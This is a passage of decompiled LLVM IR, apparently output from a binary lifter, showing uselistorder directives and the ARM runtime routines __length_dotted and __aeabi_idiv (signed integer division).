  uselistorder i32* @r2, { 83, 84, 10, 85, 86, 87, 88, 11, 25, 26, 27, 89, 90, 91, 46, 6, 47, 92, 12, 56, 93, 102, 103, 104, 105, 48, 49, 13, 7, 135, 136, 137, 138, 57, 58, 2, 59, 60, 61, 95, 96, 8, 62, 15, 16, 139, 3, 140, 145, 146, 150, 121, 39, 40, 41, 42, 43, 141, 123, 127, 128, 131, 129, 130, 124, 125, 126, 29, 120, 14, 106, 147, 19, 50, 63, 64, 65, 94, 1, 148, 5, 149, 66, 67, 68, 69, 9, 70, 71, 4, 72, 0, 73, 97, 98, 99, 100, 74, 75, 101, 17, 18, 28, 142, 143, 144, 30, 31, 32, 33, 34, 35, 36, 37, 38, 44, 45, 51, 52, 53, 54, 55, 76, 77, 78, 79, 80, 20, 21, 22, 23, 24, 81, 82, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 122, 132, 133, 134 }
  uselistorder i32* @r5, { 171, 172, 173, 174, 175, 176, 177, 8, 178, 179, 180, 181, 182, 183, 184, 5, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 26, 37, 9, 3, 38, 201, 211, 202, 203, 204, 22, 216, 212, 213, 214, 215, 217, 218, 219, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 10, 104, 105, 220, 224, 11, 226, 225, 4, 227, 12, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 256, 255, 24, 257, 87, 88, 89, 90, 91, 92, 293, 294, 106, 107, 108, 109, 110, 111, 112, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 113, 114, 0, 115, 116, 117, 118, 119, 120, 307, 308, 309, 310, 1, 311, 312, 313, 50, 51, 52, 53, 54, 55, 39, 40, 41, 42, 43, 44, 45, 169, 13, 7, 170, 46, 47, 56, 57, 58, 59, 60, 61, 62, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 63, 64, 65, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 278, 279, 14, 280, 315, 316, 317, 318, 121, 15, 122, 123, 124, 269, 270, 271, 272, 273, 274, 205, 206, 207, 208, 209, 210, 125, 16, 126, 127, 128, 129, 130, 17, 230, 231, 232, 18, 228, 229, 66, 67, 68, 233, 234, 235, 131, 132, 27, 133, 134, 19, 135, 136, 137, 138, 139, 140, 25, 141, 142, 143, 144, 28, 148, 20, 149, 150, 151, 152, 153, 154, 155, 156, 6, 157, 158, 159, 160, 161, 162, 35, 36, 145, 2, 146, 147, 49, 48, 23, 319, 320, 236, 237, 238, 239, 21, 240, 241, 163, 164, 165, 166, 167, 168, 221, 222, 223, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 314, 79, 80, 81, 82, 83, 84, 85, 86, 29, 30, 31, 32, 33, 34, 275, 276, 277 }
  uselistorder label %dec_label_pc_173b4, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_173a0.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17318.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_173c0 = load i32, i32* @r0, align 4
  store i32 %v0_173c0, i32* @lr, align 4
  %v2_173c0 = icmp eq i32 %v0_173c0, 0
  br i1 %v2_173c0, label %bb, label %dec_label_pc_173d8

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_173d0:                               ; preds = %dec_label_pc_173e0
  %v1_173d0 = add i32 %v1_173e8, 2
  br label %dec_label_pc_17400

dec_label_pc_173d8:                               ; preds = %entry
  %v0_173d8 = load i32, i32* @r1, align 4
  br label %dec_label_pc_173e8

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173e8
  %v2_173f8 = add i32 %v6_173e8, %v1_173ec
  %v2_173e0 = icmp eq i32 %v1_173f4, 192
  br i1 %v2_173e0, label %dec_label_pc_173d0, label %dec_label_pc_173e8

dec_label_pc_173e8:                               ; preds = %dec_label_pc_173e0, %dec_label_pc_173d8
  %v1_173e8 = phi i32 [ %v2_173f8, %dec_label_pc_173e0 ], [ %v0_173d8, %dec_label_pc_173d8 ]
  %v2_173e8 = add i32 %v1_173e8, %v0_173c0
  %v3_173e8 = inttoptr i32 %v2_173e8 to i8*
  %v4_173e8 = load i8, i8* %v3_173e8, align 1
  %v6_173e8 = zext i8 %v4_173e8 to i32
  %v1_173ec = add i32 %v1_173e8, 1
  %v2_173f0 = icmp eq i8 %v4_173e8, 0
  %v1_173f4 = and i32 %v6_173e8, 192
  store i32 %v1_173f4, i32* @ip, align 4
  br i1 %v2_173f0, label %dec_label_pc_17400, label %dec_label_pc_173e0

dec_label_pc_17400:                               ; preds = %dec_label_pc_173e8, %dec_label_pc_173d0
  %v1_17400 = phi i32 [ %v1_173d0, %dec_label_pc_173d0 ], [ %v1_173ec, %dec_label_pc_173e8 ]
  %v2_17400 = sub i32 %v1_17400, %v0_173d8
  ret i32 %v2_17400

; uselistorder directives
  uselistorder i32 %v1_173f4, { 1, 0 }
  uselistorder i32 %v6_173e8, { 1, 0 }
  uselistorder i32 %v1_173e8, { 2, 1, 0 }
  uselistorder i32 %v0_173c0, { 0, 2, 1 }
  uselistorder i32* @ip, { 49, 50, 51, 52, 58, 53, 54, 55, 56, 59, 60, 61, 63, 62, 65, 8, 17, 66, 67, 68, 69, 70, 71, 72, 73, 18, 5, 20, 21, 22, 23, 74, 75, 77, 78, 79, 108, 19, 25, 24, 1, 26, 27, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 28, 29, 30, 31, 32, 33, 34, 35, 169, 10, 11, 0, 12, 13, 14, 15, 16, 111, 112, 7, 113, 6, 114, 80, 81, 82, 83, 84, 85, 99, 100, 163, 57, 103, 104, 4, 105, 106, 102, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 64, 167, 164, 165, 166, 2, 168, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 45, 46, 9, 76, 47, 162, 48, 101, 107, 109, 110, 117, 116, 115, 118, 119 }
  uselistorder i8 0, { 65, 16, 24, 25, 66, 15, 21, 67, 47, 71, 69, 46, 70, 68, 45, 39, 8, 9, 72, 73, 77, 78, 23, 61, 62, 74, 75, 76, 14, 79, 40, 48, 81, 80, 49, 41, 82, 83, 84, 85, 86, 87, 10, 52, 91, 0, 89, 88, 50, 1, 90, 51, 2, 92, 93, 26, 3, 95, 94, 53, 96, 97, 98, 99, 42, 43, 101, 102, 100, 11, 12, 13, 103, 4, 27, 104, 17, 105, 106, 18, 63, 28, 29, 5, 107, 108, 109, 111, 112, 113, 114, 110, 44, 115, 116, 117, 118, 119, 19, 30, 31, 32, 33, 34, 35, 22, 6, 7, 121, 120, 36, 122, 123, 37, 124, 54, 20, 125, 126, 127, 128, 130, 55, 131, 132, 129, 133, 134, 135, 136, 138, 137, 139, 64, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 150, 152, 56, 154, 153, 38, 155, 57, 156, 158, 159, 157, 58, 160, 161, 60, 162, 59, 163, 164, 165, 166, 167, 168, 169 }
  uselistorder i32 192, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32* @r1, { 87, 88, 1, 89, 90, 91, 94, 92, 93, 9, 10, 23, 95, 96, 97, 98, 99, 100, 101, 102, 3, 103, 104, 63, 105, 106, 107, 108, 111, 114, 115, 116, 117, 118, 119, 4, 53, 54, 13, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 6, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 5, 191, 192, 11, 109, 110, 64, 65, 66, 67, 68, 69, 70, 71, 72, 14, 19, 20, 193, 2, 194, 24, 25, 133, 36, 37, 196, 134, 139, 140, 143, 141, 142, 135, 136, 137, 138, 26, 195, 27, 15, 120, 126, 131, 130, 197, 198, 199, 73, 74, 75, 16, 129, 17, 76, 121, 122, 123, 124, 125, 7, 8, 12, 77, 78, 79, 0, 80, 81, 82, 18, 22, 112, 113, 83, 84, 21, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 56, 57, 58, 59, 60, 61, 62, 85, 86, 127, 128, 132, 144 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17408 = icmp slt i32 %arg2, 0
  %v2_17408 = icmp eq i32 %arg2, 0
  %v0_1740c = load i32, i32* @r0, align 4
  %v2_1740c = xor i32 %v0_1740c, %arg2
  br i1 %v2_17408, label %dec_label_pc_17520, label %dec_label_pc_17414

dec_label_pc_17414:                               ; preds = %entry
  br i1 %v1_17408, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_17414
  %v2_17414 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_17414, %bb
  %v1_174e0 = phi i32 [ %v2_17414, %bb ], [ %arg2, %dec_label_pc_17414 ]
  %v1_17418 = add i32 %v1_174e0, -1
  %v7_17418 = icmp eq i32 %v1_174e0, 1
  br i1 %v7_17418, label %dec_label_pc_174c0, label %dec_label_pc_17420

dec_label_pc_17420:                               ; preds = %thread-pre-split
  %v1_17420 = icmp slt i32 %v0_1740c, 0
  br i1 %v1_17420, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_17420
  %v2_17424 = sub i32 0, %v0_1740c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_17420, %bb85
  %v0_17514 = phi i32 [ %v0_1740c, %dec_label_pc_17420 ], [ %v2_17424, %bb85 ]
  %v3_17428 = icmp uge i32 %v0_17514, %v1_174e0
  %v9_17428 = icmp eq i32 %v0_17514, %v1_174e0
  %v2_1742c = xor i1 %v3_17428, true
  %v3_1742c = or i1 %v9_17428, %v2_1742c
  br i1 %v3_1742c, label %dec_label_pc_174cc, label %dec_label_pc_17430

dec_label_pc_17430:                               ; preds = %bb86
  %v2_17430 = and i32 %v1_17418, %v1_174e0
  %v4_17430 = icmp eq i32 %v2_17430, 0
  br i1 %v4_17430, label %dec_label_pc_174dc, label %dec_label_pc_17438

dec_label_pc_17438:                               ; preds = %dec_label_pc_17430
  %v3_17438 = icmp ult i32 %v1_174e0, 536870912
  br i1 %v3_17438, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_17438
  %v4_1743c = mul i32 %v1_174e0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_17438, %.thread
  %v0_1745c.pr40.ph = phi i32 [ %v4_1743c, %.thread ], [ %v1_174e0, %dec_label_pc_17438 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_17438 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1745c.pr40 = phi i32 [ %v4_17450, %bb89 ], [ %v0_1745c.pr40.ph, %.preheader.preheader ]
  %v1_17454 = phi i32 [ %v4_17454, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_17448 = icmp ugt i32 %v0_1745c.pr40, 268435455
  br i1 %v2_17448, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1745cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1744c = icmp ult i32 %v0_1745c.pr40, %v0_17514
  br i1 %v4_1744c, label %bb88, label %dec_label_pc_1745cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_17450 = and i32 %v0_1745c.pr40, 268435456
  %v3_17450 = icmp eq i32 %v2_17450, 0
  %v4_17450 = mul i32 %v0_1745c.pr40, 16
  br i1 %v3_17450, label %bb89, label %dec_label_pc_1745c.loopexit

bb89:                                             ; preds = %bb88
  %v2_17454 = and i32 %v1_17454, 268435456
  %v3_17454 = icmp eq i32 %v2_17454, 0
  %v4_17454 = mul i32 %v1_17454, 16
  br i1 %v3_17454, label %.preheader, label %dec_label_pc_1745cthread-pre-split.loopexit.loopexit

dec_label_pc_1745cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1746852.ph = phi i32 [ %v1_17454, %bb87 ], [ %v4_17454, %bb89 ]
  %v0_1745c.pr42.ph = phi i32 [ %v0_1745c.pr40, %bb87 ], [ %v4_17450, %bb89 ]
  br label %dec_label_pc_1745cthread-pre-split.loopexit

dec_label_pc_1745cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1745cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1746852 = phi i32 [ %v1_17454, %.thread3 ], [ %v1_1746852.ph, %dec_label_pc_1745cthread-pre-split.loopexit.loopexit ]
  %v0_1745c.pr42 = phi i32 [ %v0_1745c.pr40, %.thread3 ], [ %v0_1745c.pr42.ph, %dec_label_pc_1745cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1745cthread-pre-split

dec_label_pc_1745cthread-pre-split:               ; preds = %dec_label_pc_1745cthread-pre-split.loopexit, %bb91
  %v1_1746850 = phi i32 [ %v1_1746852, %dec_label_pc_1745cthread-pre-split.loopexit ], [ %v3_17468, %bb91 ]
  %v2_1746048 = phi i32 [ %v0_17514, %dec_label_pc_1745cthread-pre-split.loopexit ], [ %v2_17460, %bb91 ]
  %v0_1745c.pr = phi i32 [ %v0_1745c.pr42, %dec_label_pc_1745cthread-pre-split.loopexit ], [ %v3_17464, %bb91 ]
  br label %dec_label_pc_1745c

dec_label_pc_1745c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1745c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_1745c.loopexit, %dec_label_pc_1745cthread-pre-split
  %v1_17468 = phi i32 [ %v1_1746850, %dec_label_pc_1745cthread-pre-split ], [ %v1_17454, %dec_label_pc_1745c.loopexit ]
  %v2_17460 = phi i32 [ %v2_1746048, %dec_label_pc_1745cthread-pre-split ], [ %v0_17514, %dec_label_pc_1745c.loopexit ]
  %v1_17464 = phi i32 [ %v0_1745c.pr, %dec_label_pc_1745cthread-pre-split ], [ %v4_17450, %dec_label_pc_1745c.loopexit ]
  %v2_1745c = icmp slt i32 %v1_17464, 0
  br i1 %v2_1745c, label %dec_label_pc_17470, label %bb90

bb90:                                             ; preds = %dec_label_pc_1745c
  %v4_17460 = icmp ult i32 %v1_17464, %v2_17460
  br i1 %v4_17460, label %bb91, label %dec_label_pc_17470

bb91:                                             ; preds = %bb90
  %v3_17464 = mul i32 %v1_17464, 2
  %v2_17468 = icmp slt i32 %v1_17468, 0
  %v3_17468 = mul i32 %v1_17468, 2
  br i1 %v2_17468, label %dec_label_pc_17470, label %dec_label_pc_1745cthread-pre-split

dec_label_pc_17470:                               ; preds = %bb90, %dec_label_pc_1745c, %bb91
  %v2_1747c63 = phi i32 [ %v3_17468, %bb91 ], [ %v1_17468, %bb90 ], [ %v1_17468, %dec_label_pc_1745c ]
  %v1_1747455 = phi i32 [ %v3_17464, %bb91 ], [ %v1_17464, %bb90 ], [ %v1_17464, %dec_label_pc_1745c ]
  br label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %.thread13, %dec_label_pc_17470
  %v1_174a8 = phi i32 [ %v4_174a8, %.thread13 ], [ %v2_1747c63, %dec_label_pc_17470 ]
  %v1_1747c = phi i32 [ %v1_174b8, %.thread13 ], [ 0, %dec_label_pc_17470 ]
  %v1_174ac = phi i32 [ %v4_174ac, %.thread13 ], [ %v1_1747455, %dec_label_pc_17470 ]
  %v1_17478 = phi i32 [ %v0_174a4, %.thread13 ], [ %v0_17514, %dec_label_pc_17470 ]
  %v3_17474 = icmp ult i32 %v1_17478, %v1_174ac
  br i1 %v3_17474, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_17474
  %v3_17478 = sub i32 %v1_17478, %v1_174ac
  %v3_1747c = or i32 %v1_1747c, %v1_174a8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17474, %bb92
  %v1_17484 = phi i32 [ %v1_17478, %dec_label_pc_17474 ], [ %v3_17478, %bb92 ]
  %v1_17488 = phi i32 [ %v1_1747c, %dec_label_pc_17474 ], [ %v3_1747c, %bb92 ]
  %v4_17480 = udiv i32 %v1_174ac, 2
  %v6_17480 = icmp ult i32 %v1_17484, %v4_17480
  br i1 %v6_17480, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_17484 = urem i32 %v1_174ac, 2
  %v4_17484 = icmp eq i32 %v3_17484, 0
  %v6_17484 = sub i32 %v1_17484, %v4_17480
  br i1 %v4_17484, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_17488 = udiv i32 %v1_174a8, 2
  %v6_17488 = or i32 %v1_17488, %v5_17488
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_17490 = phi i32 [ %v6_17484, %bb93 ], [ %v1_17484, %.thread8 ], [ %v6_17484, %bb94 ]
  %v1_17494 = phi i32 [ %v1_17488, %bb93 ], [ %v1_17488, %.thread8 ], [ %v6_17488, %bb94 ]
  %v4_1748c = udiv i32 %v1_174ac, 4
  %v6_1748c = icmp ult i32 %v1_17490, %v4_1748c
  br i1 %v6_1748c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_17490 = and i32 %v1_174ac, 2
  %v4_17490 = icmp eq i32 %v3_17490, 0
  %v6_17490 = sub i32 %v1_17490, %v4_1748c
  br i1 %v4_17490, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_17494 = udiv i32 %v1_174a8, 4
  %v6_17494 = or i32 %v1_17494, %v5_17494
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1749c = phi i32 [ %v6_17490, %bb95 ], [ %v1_17490, %.thread9 ], [ %v6_17490, %bb96 ]
  %v1_174a0 = phi i32 [ %v1_17494, %bb95 ], [ %v1_17494, %.thread9 ], [ %v6_17494, %bb96 ]
  %v4_17498 = udiv i32 %v1_174ac, 8
  %v6_17498 = icmp ult i32 %v1_1749c, %v4_17498
  br i1 %v6_17498, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1749c = and i32 %v1_174ac, 4
  %v4_1749c = icmp eq i32 %v3_1749c, 0
  %v6_1749c = sub i32 %v1_1749c, %v4_17498
  br i1 %v4_1749c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_174a0 = udiv i32 %v1_174a8, 8
  %v6_174a0 = or i32 %v1_174a0, %v5_174a0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_174b8 = phi i32 [ %v1_174a0, %bb97 ], [ %v1_174a0, %.thread10 ], [ %v6_174a0, %bb98 ]
  %v0_174a4 = phi i32 [ %v6_1749c, %bb97 ], [ %v1_1749c, %.thread10 ], [ %v6_1749c, %bb98 ]
  %v2_174a4 = icmp eq i32 %v0_174a4, 0
  br i1 %v2_174a4, label %dec_label_pc_174b4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_174a8, 16
  br i1 %tmp, label %dec_label_pc_174b4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_174a8 = udiv i32 %v1_174a8, 16
  %v4_174ac = udiv i32 %v1_174ac, 16
  br label %dec_label_pc_17474

dec_label_pc_174b4:                               ; preds = %thread-pre-split12, %bb99
  %v1_174b4 = icmp slt i32 %v2_1740c, 0
  br i1 %v1_174b4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_174b4
  %v2_174b8 = sub i32 0, %v1_174b8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_174c0, %dec_label_pc_174b4, %bb100
  %v1_174bc = phi i32 [ %v1_174b8, %dec_label_pc_174b4 ], [ %v2_174b8, %bb100 ], [ %v0_1740c, %dec_label_pc_174c0 ], [ %v2_174c4, %bb101 ], [ %v1_174d880, %bb103 ], [ %v2_174d4, %bb104 ]
  ret i32 %v1_174bc

dec_label_pc_174c0:                               ; preds = %thread-pre-split
  br i1 %v1_17408, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_174c0
  %v2_174c4 = sub i32 0, %v0_1740c
  br label %.thread16

dec_label_pc_174cc:                               ; preds = %bb86
  br i1 %v3_17428, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_174cc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_174cc, %bb102
  %v1_174d880 = phi i32 [ %v0_1740c, %dec_label_pc_174cc ], [ 0, %bb102 ]
  br i1 %v9_17428, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_174d0 = ashr i32 %v2_1740c, 31
  %v2_174d4 = or i32 %v4_174d0, 1
  br label %.thread16

dec_label_pc_174dc:                               ; preds = %dec_label_pc_17430
  %v2_174dc = icmp ugt i32 %v1_174e0, 65535
  br i1 %v2_174dc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_174dc
  %v2_174e0 = and i32 %v1_174e0, 32768
  %v3_174e0 = icmp eq i32 %v2_174e0, 0
  %v4_174e0 = udiv i32 %v1_174e0, 65536
  br i1 %v3_174e0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_174dc
  %v0_174ec70 = phi i32 [ %v1_174e0, %dec_label_pc_174dc ], [ %v4_174e0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_174f0 = phi i32 [ %v0_174ec70, %.thread19 ], [ %v4_174e0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_174ec = icmp ugt i32 %v1_174f0, 255
  br i1 %v2_174ec, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_174f0 = and i32 %v1_174f0, 128
  %v3_174f0 = icmp eq i32 %v2_174f0, 0
  %v4_174f0 = udiv i32 %v1_174f0, 256
  br i1 %v3_174f0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_174f4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_17500 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_174f4, %bb108 ]
  %v1_174fc = phi i32 [ %v1_174f0, %bb106 ], [ %v4_174f0, %bb107 ], [ %v4_174f0, %bb108 ]
  %v2_174f8 = icmp ugt i32 %v1_174fc, 15
  br i1 %v2_174f8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_174fc = and i32 %v1_174fc, 8
  %v3_174fc = icmp eq i32 %v2_174fc, 0
  %v4_174fc = udiv i32 %v1_174fc, 16
  br i1 %v3_174fc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_17500 = add nsw i32 %v1_17500, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_17508 = phi i32 [ %v1_17500, %.thread20 ], [ %v1_17500, %bb109 ], [ %v2_17500, %bb110 ]
  %v5_1750c = phi i32 [ %v1_174fc, %.thread20 ], [ %v4_174fc, %bb109 ], [ %v4_174fc, %bb110 ]
  %v2_17504 = icmp ugt i32 %v5_1750c, 3
  %v7_17504 = icmp eq i32 %v5_1750c, 4
  %v2_17508 = xor i1 %v7_17504, true
  %v3_17508 = and i1 %v2_17504, %v2_17508
  br i1 %v3_17508, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_17508 = add nsw i32 %v4_17508, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1750c = phi i32 [ %v4_17508, %.thread21 ], [ %v5_17508, %bb111 ]
  %v2_1750c = xor i1 %v2_17504, true
  %v3_1750c = or i1 %v7_17504, %v2_1750c
  br i1 %v3_1750c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1750c = udiv i32 %v5_1750c, 2
  %v9_1750c = add i32 %v4_1750c, %v8_1750c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_17514 = phi i32 [ %v4_1750c, %bb112 ], [ %v9_1750c, %bb113 ]
  %v1_17510 = icmp slt i32 %v2_1740c, 0
  %v6_17514 = lshr i32 %v0_17514, %v1_17514
  %v2_17518 = sub i32 0, %v6_17514
  %v2_17518.v6_17514 = select i1 %v1_17510, i32 %v2_17518, i32 %v6_17514
  ret i32 %v2_17518.v6_17514

dec_label_pc_17520:                               ; preds = %entry
  %v0_17520 = load i32, i32* @lr, align 4
  %v0_17524 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_17520)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1750c, { 1, 0 }
  uselistorder i1 %v7_17504, { 1, 0 }
  uselistorder i32 %v4_174fc, { 1, 0 }
  uselistorder i32 %v1_174fc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_174f0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_174f0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_174e0, { 1, 0 }
  uselistorder i32 %v0_174a4, { 1, 0 }
  uselistorder i32 %v4_17498, { 1, 0 }
  uselistorder i32 %v1_174a0, { 1, 2, 0 }
  uselistorder i32 %v4_1748c, { 1, 0 }
  uselistorder i32 %v1_17494, { 1, 2, 0 }
  uselistorder i32 %v4_17480, { 1, 0 }
  uselistorder i32 %v1_17488, { 1, 2, 0 }
  uselistorder i32 %v1_174ac, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1747c, { 1, 0 }
  uselistorder i32 %v1_174a8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_17468, { 1, 0 }
  uselistorder i32 %v3_17464, { 1, 0 }
  uselistorder i32 %v1_17464, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17460, { 1, 0 }
  uselistorder i32 %v1_17468, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17454, { 1, 0 }
  uselistorder i32 %v4_17450, { 2, 1, 0 }
  uselistorder i32 %v1_17454, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1745c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_17428, { 1, 0 }
  uselistorder i32 %v1_174e0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1740c, { 1, 0, 2 }
  uselistorder i32 %v0_1740c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 46, 48, 49, 50, 53, 54, 55, 3, 57, 58, 59, 60, 61, 17, 18, 19, 20, 21, 22, 23, 62, 69, 70, 71, 72, 73, 74, 75, 83, 25, 24, 0, 26, 27, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 65, 28, 29, 30, 7, 32, 33, 31, 84, 85, 86, 116, 47, 79, 117, 118, 119, 12, 13, 14, 15, 87, 88, 89, 120, 51, 52, 81, 82, 34, 35, 76, 77, 78, 56, 63, 16, 66, 67, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 64, 10, 11, 68, 80, 90, 91, 8, 9 }
  uselistorder i32 3, { 68, 44, 26, 27, 70, 21, 71, 72, 22, 73, 74, 13, 64, 0, 29, 28, 45, 3, 2, 1, 4, 75, 30, 5, 6, 14, 7, 8, 46, 47, 82, 48, 49, 50, 51, 52, 53, 65, 11, 31, 66, 12, 58, 83, 17, 59, 79, 80, 23, 78, 15, 76, 16, 67, 9, 10, 54, 24, 55, 25, 81, 56, 19, 32, 60, 61, 20, 62, 33, 63, 57, 36, 35, 34, 43, 69, 37, 77, 38, 39, 40, 41, 42, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 7, 0, 4, 6 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 155, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 152, 65, 153, 66, 154, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 148, 1, 79, 80, 81, 82, 85, 84, 83, 86, 87, 90, 89, 88, 91, 92, 93, 94, 95, 96, 97, 98, 156, 99, 100, 101, 147, 106, 102, 103, 107, 104, 105, 108, 113, 109, 110, 112, 111, 114, 116, 115, 149, 117, 150, 119, 118, 120, 121, 122, 125, 123, 124, 126, 127, 128, 130, 129, 131, 132, 133, 136, 134, 135, 137, 138, 140, 139, 141, 142, 143, 144, 145, 146, 151 }
  uselistorder i32 128, { 11, 6, 7, 9, 5, 18, 0, 20, 21, 1, 19, 8, 14, 15, 2, 3, 10, 16, 17, 4, 13, 12 }
  uselistorder i32 255, { 7, 10, 1, 9, 0, 8, 4, 2, 3, 5, 6 }
